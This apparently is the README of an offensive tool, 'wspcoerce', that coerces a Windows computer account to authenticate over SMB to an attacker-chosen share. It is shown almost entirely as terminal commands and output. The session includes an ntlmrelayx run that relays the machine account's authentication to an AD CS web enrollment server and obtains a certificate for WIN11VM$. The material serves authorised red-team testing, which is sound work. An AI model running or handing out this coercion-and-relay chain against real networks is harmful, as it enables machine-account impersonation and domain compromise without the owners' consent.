`wspcoerce` coerces a Windows computer account via SMB to an arbitrary target.
Based on [the finding by slemire](https://github.com/slemire/WSPCoerce).

```
$ wspcoerce 'lab.redteam/rtpttest:test1234!@192.0.2.115' "file:////attacksystem/share"
Impacket v0.13.0.dev0+20250408.175013.349160df - Copyright 2023 Fortra

[*] Connected to IPC$
[*] Opened MsFteWds pipe
[*] Sent WSP Connect
[*] Sent WSP Query
[*] Sent WSP Disconnect
```

```
$ ntlmrelayx.py -t "http://192.0.2.5/certsrv/" -debug -6 -smb2support --adcs
[...]
[*] SMBD-Thread-6 (process_request_thread): Received connection from 192.0.2.115, attacking target http://192.0.2.5
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.0.2.5 as LAB/WIN11VM$ SUCCEED
[*] SMBD-Thread-8 (process_request_thread): Received connection from 192.0.2.115, attacking target http://192.0.2.5
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.0.2.5 as LAB/WIN11VM$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 17
[*] Writing PKCS#12 certificate to ./WIN11VM$.pfx
[*] Certificate successfully written to file
[*] Skipping user WIN11VM$ since attack was already performed
```
